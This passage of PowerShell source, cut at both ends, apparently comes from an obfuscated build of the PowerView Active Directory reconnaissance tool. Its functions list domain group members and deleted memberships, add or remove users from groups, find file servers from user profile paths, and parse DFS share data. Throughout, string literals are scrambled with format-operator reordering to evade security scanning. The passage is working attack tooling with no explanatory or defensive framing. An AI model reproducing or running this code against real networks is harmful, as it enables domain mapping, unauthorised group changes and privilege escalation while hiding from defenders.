                                Write-Warning ('['+'G'+'et-Domai'+'nGro'+'upMemb'+'er'+'] '+'Error'+' '+'con'+'v'+'er'+'ting '+"$MemberDN")
                                $MemberDomain = $Null
                            }
                        }
                        else {
                            
                            $MemberDomain = $MemberDN.SubString($MemberDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        $MemberDN = $Null
                        $MemberDomain = $Null
                    }

                    if ($Properties.samaccountname) {
                        
                        $MemberName = $Properties.samaccountname[0]
                    }
                    else {
                        
                        try {
                            $MemberName = ConvertFrom-SID -ObjectSID $Properties.cn[0] @ADNameArguments
                        }
                        catch {
                            
                            $MemberName = $Properties.cn[0]
                        }
                    }

                    if ($Properties.objectclass -match ("{1}{2}{0}" -f'ter','comp','u')) {
                        $MemberObjectClass = ("{2}{0}{1}" -f 'e','r','comput')
                    }
                    elseif ($Properties.objectclass -match ("{0}{1}" -f'grou','p')) {
                        $MemberObjectClass = ("{1}{0}"-f'p','grou')
                    }
                    elseif ($Properties.objectclass -match ("{1}{0}"-f'er','us')) {
                        $MemberObjectClass = ("{0}{1}" -f'use','r')
                    }
                    else {
                        $MemberObjectClass = $Null
                    }
                    $GroupMember | Add-Member Noteproperty ("{3}{1}{0}{2}" -f 'mai','mberDo','n','Me') $MemberDomain
                    $GroupMember | Add-Member Noteproperty ("{1}{2}{0}"-f'ame','Memb','erN') $MemberName
                    $GroupMember | Add-Member Noteproperty ("{0}{4}{5}{2}{3}{1}" -f 'MemberD','Name','tinguish','ed','i','s') $MemberDN
                    $GroupMember | Add-Member Noteproperty ("{1}{0}{2}{3}{4}"-f 'ct','MemberObje','Cl','a','ss') $MemberObjectClass
                    $GroupMember | Add-Member Noteproperty ("{1}{3}{0}{2}"-f 'S','Mem','ID','ber') $MemberSID
                    $GroupMember.PSObject.TypeNames.Insert(0, ("{5}{4}{1}{3}{0}{2}"-f 'e','r','mber','oupM','werView.G','Po'))
                    $GroupMember

                    
                    if ($PSBoundParameters[("{0}{1}"-f'Recurs','e')] -and $MemberDN -and ($MemberObjectClass -match ("{1}{0}" -f'p','grou'))) {
                        Write-Verbose ('[Get-Dom'+'ainGr'+'o'+'upMem'+'ber] '+'Manua'+'l'+'ly '+'r'+'ecu'+'r'+'sing '+'on'+' '+'gr'+'oup: '+"$MemberDN")
                        $SearcherArguments[("{1}{2}{0}"-f 'ty','Iden','ti')] = $MemberDN
                        $Null = $SearcherArguments.Remove(("{2}{1}{0}"-f 'erties','op','Pr'))
                        Get-DomainGroupMember @SearcherArguments
                    }
                }
            }
            $GroupSearcher.dispose()
        }
    }
}


function Get-DomainGroupMemberDeleted {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{5}{6}{1}{2}{0}{4}" -f 'm','hanA','ssign','PSUseDec','ents','lare','dVarsMoreT'}, '')]
    [OutputType({"{6}{8}{7}{5}{2}{1}{4}{0}{3}"-f'Delete','.','ew','d','DomainGroupMember','i','P','rV','owe'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{3}{2}{1}{0}"-f 'ishedName','stingu','i','D'}, {"{2}{1}{4}{0}{3}"-f 'tNam','mAcco','Sa','e','un'}, {"{1}{0}" -f 'ame','N'}, {"{1}{2}{3}{4}{0}{5}"-f 'shedNam','Membe','rDist','i','ngui','e'}, {"{3}{1}{0}{2}"-f 'mberNam','e','e','M'})]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f 'lter','Fi'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f'A','DSP','ath'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{3}{2}"-f 'DomainContr','oll','r','e'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}" -f 'se','Ba'}, {"{0}{2}{1}"-f'OneLev','l','e'}, {"{1}{0}{2}"-f'ub','S','tree'})]
        [String]
        $SearchScope = ("{0}{2}{1}" -f'Sub','ee','tr'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            ("{1}{3}{2}{0}" -f 'perties','P','o','r')    =   ("{2}{0}{3}{5}{1}{6}{4}" -f'-replva','e','msds','l','adata','u','met'),("{1}{2}{0}{4}{3}" -f't','d','is','ishedname','ingu')
            'Raw'           =   $True
            ("{1}{2}{0}{3}" -f'il','L','DAPF','ter')    =   ("{1}{4}{0}{2}{3}"-f'tC','(ob','ate','gory=group)','jec')
        }
        if ($PSBoundParameters[("{1}{0}"-f'main','Do')]) { $SearcherArguments[("{1}{0}"-f 'in','Doma')] = $Domain }
        if ($PSBoundParameters[("{0}{3}{1}{2}"-f'LDA','t','er','PFil')]) { $SearcherArguments[("{3}{1}{0}{2}" -f'e','Filt','r','LDAP')] = $LDAPFilter }
        if ($PSBoundParameters[("{2}{0}{1}"-f'earc','hBase','S')]) { $SearcherArguments[("{2}{1}{0}"-f 'se','Ba','Search')] = $SearchBase }
        if ($PSBoundParameters[("{0}{1}"-f'Se','rver')]) { $SearcherArguments[("{1}{2}{0}"-f 'er','Se','rv')] = $Server }
        if ($PSBoundParameters[("{1}{0}{2}"-f'chS','Sear','cope')]) { $SearcherArguments[("{0}{3}{1}{2}" -f'Sea','c','ope','rchS')] = $SearchScope }
        if ($PSBoundParameters[("{1}{2}{4}{3}{0}"-f 'Size','Res','u','age','ltP')]) { $SearcherArguments[("{4}{1}{3}{0}{2}"-f'z','tP','e','ageSi','Resul')] = $ResultPageSize }
        if ($PSBoundParameters[("{1}{3}{0}{2}"-f'meL','Serv','imit','erTi')]) { $SearcherArguments[("{0}{3}{4}{1}{2}"-f 'Se','TimeL','imit','rve','r')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{1}{2}{0}"-f'ne','Tom','bsto')]) { $SearcherArguments[("{2}{1}{0}"-f 'e','ton','Tombs')] = $Tombstone }
        if ($PSBoundParameters[("{2}{0}{1}"-f 'ia','l','Credent')]) { $SearcherArguments[("{0}{1}{2}"-f'Cred','ent','ial')] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters[("{1}{2}{0}"-f 'ty','Ide','nti')]) { $SearcherArguments[("{0}{2}{1}"-f'Iden','y','tit')] = $Identity }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties[("{4}{1}{3}{0}{2}" -f'uis','isti','hedname','ng','d')][0]
            ForEach($XMLNode in $_.Properties[("{0}{3}{2}{4}{1}{5}"-f'ms','lval','s-','d','rep','uemetadata')]) {
                $TempObject = [xml]$XMLNode | Select-Object -ExpandProperty ("{3}{5}{1}{0}{2}{4}" -f 'A','EPL_V','LUE_META','D','_DATA','S_R') -ErrorAction SilentlyContinue
                if ($TempObject) {
                    if (($TempObject.pszAttributeName -Match ("{0}{1}" -f 'me','mber')) -and (($TempObject.dwVersion % 2) -eq 0 )) {
                        $Output = New-Object PSObject
                        $Output | Add-Member NoteProperty ("{0}{1}" -f 'G','roupDN') $ObjectDN
                        $Output | Add-Member NoteProperty ("{2}{1}{0}" -f 'erDN','mb','Me') $TempObject.pszObjectDn
                        $Output | Add-Member NoteProperty ("{2}{3}{0}{1}"-f 'FirstAd','ded','Tim','e') $TempObject.ftimeCreated
                        $Output | Add-Member NoteProperty ("{3}{0}{1}{2}" -f'im','eDele','ted','T') $TempObject.ftimeDeleted
                        $Output | Add-Member NoteProperty ("{3}{1}{2}{4}{0}"-f'ange','stOrigi','nat','La','ingCh') $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty ("{0}{2}{1}"-f'T','ed','imesAdd') ($TempObject.dwVersion / 2)
                        $Output | Add-Member NoteProperty ("{2}{3}{5}{0}{1}{4}"-f'riginati','n','L','ast','gDsaDN','O') $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, ("{5}{3}{4}{2}{6}{0}{1}"-f'mberDel','eted','omainGro','V','iew.D','Power','upMe'))
                        $Output
                    }
                }
                else {
                    Write-Verbose ('[Get-'+'DomainGr'+'ou'+'pM'+'e'+'m'+'ber'+'D'+'elete'+'d] '+'Err'+'or '+'re'+'tr'+'ievi'+'ng '+('{0}'+'msds-rep'+'lvaluem'+'eta'+'d'+'ata{0} ') -f[CHar]39+'for'+' '+"'$ObjectDN'")
                }
            }
        }
    }
}


function Add-DomainGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{1}{3}{4}" -f'PS','P','Should','ro','cess'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias({"{1}{0}{2}" -f'roup','G','Name'}, {"{1}{2}{0}" -f'dentity','Grou','pI'})]
        [String]
        $Identity,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{1}{3}{2}{0}"-f'tity','Mem','rIden','be'}, {"{0}{1}" -f 'Membe','r'}, {"{4}{1}{2}{3}{0}"-f 'e','tingui','shed','Nam','Dis'})]
        [String[]]
        $Members,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ContextArguments = @{
            ("{2}{1}{0}" -f'ity','t','Iden') = $Identity
        }
        if ($PSBoundParameters[("{1}{0}"-f'main','Do')]) { $ContextArguments[("{0}{1}{2}"-f 'Dom','ai','n')] = $Domain }
        if ($PSBoundParameters[("{2}{0}{1}"-f 'r','edential','C')]) { $ContextArguments[("{2}{1}{0}" -f 'al','nti','Crede')] = $Credential }

        $GroupContext = Get-PrincipalContext @ContextArguments

        if ($GroupContext) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
            }
            catch {
                Write-Warning ('[Ad'+'d-'+'DomainGr'+'oupMemb'+'er]'+' '+'Err'+'or '+'fi'+'nding '+'th'+'e '+'g'+'roup'+' '+'i'+'de'+'ntity '+"'$Identity' "+': '+"$_")
            }
        }
    }

    PROCESS {
        if ($Group) {
            ForEach ($Member in $Members) {
                if ($Member -match ((("{3}{2}{1}{0}"-f'.+','V','MVfM','.+f'))-crEPlaCe'fMV',[cHar]92)) {
                    $ContextArguments[("{2}{0}{1}" -f 'ti','ty','Iden')] = $Member
                    $UserContext = Get-PrincipalContext @ContextArguments
                    if ($UserContext) {
                        $UserIdentity = $UserContext.Identity
                    }
                }
                else {
                    $UserContext = $GroupContext
                    $UserIdentity = $Member
                }
                Write-Verbose ('[A'+'d'+'d-'+'Do'+'ma'+'in'+'Gr'+'oupMember] '+'Adding'+' '+'mem'+'be'+'r '+"'$Member' "+'t'+'o '+'g'+'roup '+"'$Identity'")
                $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
                $Group.Members.Add($Member)
                $Group.Save()
            }
        }
    }
}


function Remove-DomainGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{4}{0}{2}{1}"-f'oc','ss','e','PSSh','ouldPr'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias({"{2}{0}{1}"-f'upNa','me','Gro'}, {"{1}{0}{3}{2}"-f'r','G','tity','oupIden'})]
        [String]
        $Identity,

        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias({"{2}{0}{1}"-f'Iden','tity','Member'}, {"{2}{1}{0}"-f'er','b','Mem'}, {"{3}{5}{1}{2}{4}{0}" -f'ame','uis','hed','Di','N','sting'})]
        [String[]]
        $Members,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ContextArguments = @{
            ("{2}{1}{0}"-f 'ity','dent','I') = $Identity
        }
        if ($PSBoundParameters[("{1}{0}" -f 'main','Do')]) { $ContextArguments[("{1}{0}"-f'n','Domai')] = $Domain }
        if ($PSBoundParameters[("{0}{2}{1}" -f 'Crede','al','nti')]) { $ContextArguments[("{3}{0}{2}{1}"-f'ed','tial','en','Cr')] = $Credential }

        $GroupContext = Get-PrincipalContext @ContextArguments

        if ($GroupContext) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($GroupContext.Context, $GroupContext.Identity)
            }
            catch {
                Write-Warning ('[R'+'em'+'ove-Doma'+'in'+'Gr'+'oupMe'+'mbe'+'r] '+'Erro'+'r '+'fi'+'nd'+'ing '+'th'+'e '+'grou'+'p '+'id'+'entity '+"'$Identity' "+': '+"$_")
            }
        }
    }

    PROCESS {
        if ($Group) {
            ForEach ($Member in $Members) {
                if ($Member -match (('.+{0}{0}.+')  -F  [ChaR]92)) {
                    $ContextArguments[("{1}{0}" -f 'ntity','Ide')] = $Member
                    $UserContext = Get-PrincipalContext @ContextArguments
                    if ($UserContext) {
                        $UserIdentity = $UserContext.Identity
                    }
                }
                else {
                    $UserContext = $GroupContext
                    $UserIdentity = $Member
                }
                Write-Verbose ('['+'R'+'emov'+'e-Do'+'mainG'+'rou'+'p'+'M'+'ember] '+'Re'+'m'+'ovi'+'ng '+'m'+'em'+'ber '+"'$Member' "+'from'+' '+'gr'+'oup'+' '+"'$Identity'")
                $Member = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($UserContext.Context, $UserIdentity)
                $Group.Members.Remove($Member)
                $Group.Save()
            }
        }
    }
}


function Get-DomainFileServer {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}" -f'roces','s','PSShouldP'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f'Domai','e','nNam'}, {"{0}{1}" -f 'N','ame'})]
        [String[]]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'Fil','ter'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f 'Pat','ADS','h'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}"-f 'Do','mainContro','ller'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}"-f 'ase','B'}, {"{2}{0}{1}"-f 'eve','l','OneL'}, {"{1}{0}"-f'btree','Su'})]
        [String]
        $SearchScope = ("{0}{2}{1}" -f'Subtr','e','e'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        function Split-Path {
            
            Param([String]$Path)

            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                $Temp = $Path.split('\\')[2]
                if ($Temp -and ($Temp -ne '')) {
                    $Temp
                }
            }
        }

        $SearcherArguments = @{
            ("{0}{2}{1}"-f 'L','r','DAPFilte') = ((("{10}{26}{3}{4}{1}{6}{5}{25}{20}{2}{24}{22}{13}{14}{11}{23}{0}{8}{27}{7}{19}{12}{9}{18}{17}{16}{21}{15}" -f'(homedi','e=8','ccou','countTy','p','s','05306368)(!(u','(scri','recto','th=*)','(&(sam','.1','tpa','40.113','556','))','l','fi','(pro','p','rA','epath=*)','2.8','.4.803:=2))(PM0','ntControl:1.','e','Ac','ry=*)')).rEPlace('PM0',[sTring][CHar]124))
            ("{0}{2}{1}"-f'Proper','es','ti') = ("{2}{1}{4}{5}{3}{0}"-f 'filepath','tory,scri','homedirec','pro','ptpa','th,')
        }
        if ($PSBoundParameters[("{2}{1}{0}"-f 'se','hBa','Searc')]) { $SearcherArguments[("{3}{2}{0}{1}"-f 's','e','a','SearchB')] = $SearchBase }
        if ($PSBoundParameters[("{1}{0}"-f'erver','S')]) { $SearcherArguments[("{1}{0}" -f 'r','Serve')] = $Server }
        if ($PSBoundParameters[("{1}{2}{0}"-f'chScope','S','ear')]) { $SearcherArguments[("{1}{0}{2}" -f'ch','Sear','Scope')] = $SearchScope }
        if ($PSBoundParameters[("{3}{1}{2}{0}"-f'ize','ltPa','geS','Resu')]) { $SearcherArguments[("{0}{2}{1}" -f'Result','ze','PageSi')] = $ResultPageSize }
        if ($PSBoundParameters[("{0}{3}{1}{2}" -f 'ServerTi','m','it','meLi')]) { $SearcherArguments[("{1}{0}{2}" -f 'rverTimeLimi','Se','t')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{2}{1}{0}" -f 'ne','o','Tombst')]) { $SearcherArguments[("{1}{0}{2}"-f'mbs','To','tone')] = $Tombstone }
        if ($PSBoundParameters[("{2}{1}{0}"-f 'l','entia','Cred')]) { $SearcherArguments[("{1}{2}{0}" -f 'al','Cr','edenti')] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters[("{0}{1}"-f'Doma','in')]) {
            ForEach ($TargetDomain in $Domain) {
                $SearcherArguments[("{0}{1}"-f'Doma','in')] = $TargetDomain
                $UserSearcher = Get-DomainSearcher @SearcherArguments
                
                $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties[("{2}{3}{0}{1}" -f 'cto','ry','h','omedire')]) {Split-Path($UserResult.Properties[("{1}{3}{2}{0}"-f 'rectory','h','i','omed')])}if ($UserResult.Properties[("{1}{3}{2}{0}" -f 'ath','scr','tp','ip')]) {Split-Path($UserResult.Properties[("{1}{2}{0}" -f'th','scriptp','a')])}if ($UserResult.Properties[("{1}{2}{0}" -f 'path','prof','ile')]) {Split-Path($UserResult.Properties[("{1}{2}{0}" -f'lepath','pr','ofi')])}}) | Sort-Object -Unique
            }
        }
        else {
            $UserSearcher = Get-DomainSearcher @SearcherArguments
            $(ForEach($UserResult in $UserSearcher.FindAll()) {if ($UserResult.Properties[("{0}{2}{1}"-f 'hom','ory','edirect')]) {Split-Path($UserResult.Properties[("{0}{2}{1}{3}" -f'homedir','o','ect','ry')])}if ($UserResult.Properties[("{0}{1}{2}"-f'scr','i','ptpath')]) {Split-Path($UserResult.Properties[("{0}{1}{2}" -f 'scrip','t','path')])}if ($UserResult.Properties[("{1}{2}{0}"-f 'h','prof','ilepat')]) {Split-Path($UserResult.Properties[("{0}{1}{2}" -f'pr','ofi','lepath')])}}) | Sort-Object -Unique
        }
    }
}


function Get-DomainDFSShare {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{4}{1}{0}{2}" -f 'oces','Pr','s','PSShoul','d'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{7}{5}{1}{8}{2}{0}{6}{4}"-f 'g','ore','nAssi','PSUseDec','ents','arsM','nm','laredV','Tha'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{1}{0}"-f 'rbs','ApprovedVe','SUse','P'}, '')]
    [OutputType({"{10}{11}{3}{5}{0}{6}{1}{7}{9}{4}{2}{8}"-f'm.Manag','omati','b','t','SCustomO','e','ement.Aut','on.','ject','P','Sy','s'})]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{3}{1}{0}" -f'e','ainNam','D','om'}, {"{1}{0}" -f'ame','N'})]
        [String[]]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f 'ADSP','ath'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}{3}" -f 'ontr','olle','DomainC','r'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}"-f'ase','B'}, {"{1}{0}" -f 'l','OneLeve'}, {"{1}{0}" -f'tree','Sub'})]
        [String]
        $SearchScope = ("{0}{2}{1}"-f 'Su','e','btre'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $Version = 'All'
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[("{2}{0}{1}"-f'archB','ase','Se')]) { $SearcherArguments[("{2}{1}{0}"-f'chBase','r','Sea')] = $SearchBase }
        if ($PSBoundParameters[("{1}{0}" -f'erver','S')]) { $SearcherArguments[("{0}{1}" -f'S','erver')] = $Server }
        if ($PSBoundParameters[("{0}{2}{1}"-f 'Searc','cope','hS')]) { $SearcherArguments[("{0}{2}{1}" -f'Se','chScope','ar')] = $SearchScope }
        if ($PSBoundParameters[("{0}{2}{1}" -f'Resu','ageSize','ltP')]) { $SearcherArguments[("{3}{1}{2}{0}" -f 'Size','ag','e','ResultP')] = $ResultPageSize }
        if ($PSBoundParameters[("{3}{1}{0}{2}" -f 'eL','rverTim','imit','Se')]) { $SearcherArguments[("{1}{0}{2}"-f'Time','Server','Limit')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{2}{1}{3}{0}"-f'stone','om','T','b')]) { $SearcherArguments[("{2}{0}{1}"-f 't','one','Tombs')] = $Tombstone }
        if ($PSBoundParameters[("{2}{0}{1}"-f 'enti','al','Cred')]) { $SearcherArguments[("{0}{1}{2}" -f 'Cred','e','ntial')] = $Credential }

        function Parse-Pkt {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Pkt
            )

            $bin = $Pkt
            $blob_version = [bitconverter]::ToUInt32($bin[0..3],0)
            $blob_element_count = [bitconverter]::ToUInt32($bin[4..7],0)
            $offset = 8
            
            $object_list = @()
            for($i=1; $i -le $blob_element_count; $i++){
                $blob_name_size_start = $offset
                $blob_name_size_end = $offset + 1
                $blob_name_size = [bitconverter]::ToUInt16($bin[$blob_name_size_start..$blob_name_size_end],0)

                $blob_name_start = $blob_name_size_end + 1
                $blob_name_end = $blob_name_start + $blob_name_size - 1
                $blob_name = [System.Text.Encoding]::Unicode.GetString($bin[$blob_name_start..$blob_name_end])

                $blob_data_size_start = $blob_name_end + 1
                $blob_data_size_end = $blob_data_size_start + 3
                $blob_data_size = [bitconverter]::ToUInt32($bin[$blob_data_size_start..$blob_data_size_end],0)

                $blob_data_start = $blob_data_size_end + 1
                $blob_data_end = $blob_data_start + $blob_data_size - 1
                $blob_data = $bin[$blob_data_start..$blob_data_end]
                switch -wildcard ($blob_name) {
                    ((("{3}{1}{2}{0}" -f'ot','0}site','ro','{'))-F  [ChAR]92) {  }
                    ((("{1}{2}{0}" -f 't*','4fndomainro','o')) -CRePlAce([CHaR]52+[CHaR]102+[CHaR]110),[CHaR]92) {
                        
                        
                        $root_or_link_guid_start = 0
                        $root_or_link_guid_end = 15
                        $root_or_link_guid = [byte[]]$blob_data[$root_or_link_guid_start..$root_or_link_guid_end]
                        $guid = New-Object Guid(,$root_or_link_guid) 
                        $prefix_size_start = $root_or_link_guid_end + 1
                        $prefix_size_end = $prefix_size_start + 1
                        $prefix_size = [bitconverter]::ToUInt16($blob_data[$prefix_size_start..$prefix_size_end],0)
                        $prefix_start = $prefix_size_end + 1
                        $prefix_end = $prefix_start + $prefix_size - 1
                        $prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$prefix_start..$prefix_end])

                        $short_prefix_size_start = $prefix_end + 1
                        $short_prefix_size_end = $short_prefix_size_start + 1
                        $short_prefix_size = [bitconverter]::ToUInt16($blob_data[$short_prefix_size_start..$short_prefix_size_end],0)
                        $short_prefix_start = $short_prefix_size_end + 1
                        $short_prefix_end = $short_prefix_start + $short_prefix_size - 1
                        $short_prefix = [System.Text.Encoding]::Unicode.GetString($blob_data[$short_prefix_start..$short_prefix_end])

                        $type_start = $short_prefix_end + 1
                        $type_end = $type_start + 3
                        $type = [bitconverter]::ToUInt32($blob_data[$type_start..$type_end],0)

                        $state_start = $type_end + 1
                        $state_end = $state_start + 3
                        $state = [bitconverter]::ToUInt32($blob_data[$state_start..$state_end],0)

                        $comment_size_start = $state_end + 1
                        $comment_size_end = $comment_size_start + 1
                        $comment_size = [bitconverter]::ToUInt16($blob_data[$comment_size_start..$comment_size_end],0)
                        $comment_start = $comment_size_end + 1
                        $comment_end = $comment_start + $comment_size - 1
                        if ($comment_size -gt 0)  {
                            $comment = [System.Text.Encoding]::Unicode.GetString($blob_data[$comment_start..$comment_end])
                        }
                        $prefix_timestamp_start = $comment_end + 1
                        $prefix_timestamp_end = $prefix_timestamp_start + 7
                        
                        $prefix_timestamp = $blob_data[$prefix_timestamp_start..$prefix_timestamp_end] 
                        $state_timestamp_start = $prefix_timestamp_end + 1
                        $state_timestamp_end = $state_timestamp_start + 7
                        $state_timestamp = $blob_data[$state_timestamp_start..$state_timestamp_end]
                        $comment_timestamp_start = $state_timestamp_end + 1
                        $comment_timestamp_end = $comment_timestamp_start + 7
                        $comment_timestamp = $blob_data[$comment_timestamp_start..$comment_timestamp_end]
                        $version_start = $comment_timestamp_end  + 1
                        $version_end = $version_start + 3
                        $version = [bitconverter]::ToUInt32($blob_data[$version_start..$version_end],0)

                        
                        $dfs_targetlist_blob_size_start = $version_end + 1
                        $dfs_targetlist_blob_size_end = $dfs_targetlist_blob_size_start + 3
                        $dfs_targetlist_blob_size = [bitconverter]::ToUInt32($blob_data[$dfs_targetlist_blob_size_start..$dfs_targetlist_blob_size_end],0)

                        $dfs_targetlist_blob_start = $dfs_targetlist_blob_size_end + 1
                        $dfs_targetlist_blob_end = $dfs_targetlist_blob_start + $dfs_targetlist_blob_size - 1
                        $dfs_targetlist_blob = $blob_data[$dfs_targetlist_blob_start..$dfs_targetlist_blob_end]
                        $reserved_blob_size_start = $dfs_targetlist_blob_end + 1
                        $reserved_blob_size_end = $reserved_blob_size_start + 3
                        $reserved_blob_size = [bitconverter]::ToUInt32($blob_data[$reserved_blob_size_start..$reserved_blob_size_end],0)

                        $reserved_blob_start = $reserved_blob_size_end + 1
                        $reserved_blob_end = $reserved_blob_start + $reserved_blob_size - 1
                        $reserved_blob = $blob_data[$reserved_blob_start..$reserved_blob_end]
                        $referral_ttl_start = $reserved_blob_end + 1
                        $referral_ttl_end = $referral_ttl_start + 3
                        $referral_ttl = [bitconverter]::ToUInt32($blob_data[$referral_ttl_start..$referral_ttl_end],0)

                        
                        $target_count_start = 0
                        $target_count_end = $target_count_start + 3
                        $target_count = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_count_start..$target_count_end],0)
                        $t_offset = $target_count_end + 1

                        for($j=1; $j -le $target_count; $j++){
                            $target_entry_size_start = $t_offset
                            $target_entry_size_end = $target_entry_size_start + 3
                            $target_entry_size = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_entry_size_start..$target_entry_size_end],0)
                            $target_time_stamp_start = $target_entry_size_end + 1
                            $target_time_stamp_end = $target_time_stamp_start + 7
                            
                            $target_time_stamp = $dfs_targetlist_blob[$target_time_stamp_start..$target_time_stamp_end]
                            $target_state_start = $target_time_stamp_end + 1
                            $target_state_end = $target_state_start + 3
                            $target_state = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_state_start..$target_state_end],0)

                            $target_type_start = $target_state_end + 1
                            $target_type_end = $target_type_start + 3
                            $target_type = [bitconverter]::ToUInt32($dfs_targetlist_blob[$target_type_start..$target_type_end],0)

                            $server_name_size_start = $target_type_end + 1
                            $server_name_size_end = $server_name_size_start + 1
                            $server_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$server_name_size_start..$server_name_size_end],0)

                            $server_name_start = $server_name_size_end + 1
                            $server_name_end = $server_name_start + $server_name_size - 1
                            $server_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$server_name_start..$server_name_end])

                            $share_name_size_start = $server_name_end + 1
                            $share_name_size_end = $share_name_size_start + 1
                            $share_name_size = [bitconverter]::ToUInt16($dfs_targetlist_blob[$share_name_size_start..$share_name_size_end],0)
                            $share_name_start = $share_name_size_end + 1
                            $share_name_end = $share_name_start + $share_name_size - 1
                            $share_name = [System.Text.Encoding]::Unicode.GetString($dfs_targetlist_blob[$share_name_start..$share_name_end])

                            $target_list += "\\$server_name\$share_name"
                            $t_offset = $share_name_end + 1
                        }
                    }
                }
                $offset = $blob_data_end + 1
                $dfs_pkt_properties = @{
                    ("{1}{0}"-f 'ame','N') = $blob_name
                    ("{0}{1}" -f'Prefi','x') = $prefix
                    ("{1}{2}{0}"-f 'ist','Target','L') = $target_list
                }
                $object_list += New-Object -TypeName PSObject -Property $dfs_pkt_properties
                $prefix = $Null
                $blob_name = $Null
                $target_list = $Null
            }

            $servers = @()
            $object_list | ForEach-Object {
                if ($_.TargetList) {
                    $_.TargetList | ForEach-Object {
                        $servers += $_.split('\')[2]
                    }
                }
            }

            $servers
        }

        function Get-DomainDFSShareV1 {
            [CmdletBinding()]
            Param(
                [String]
                $Domain,

                [String]
                $SearchBase,

                [String]
                $Server,

                [String]
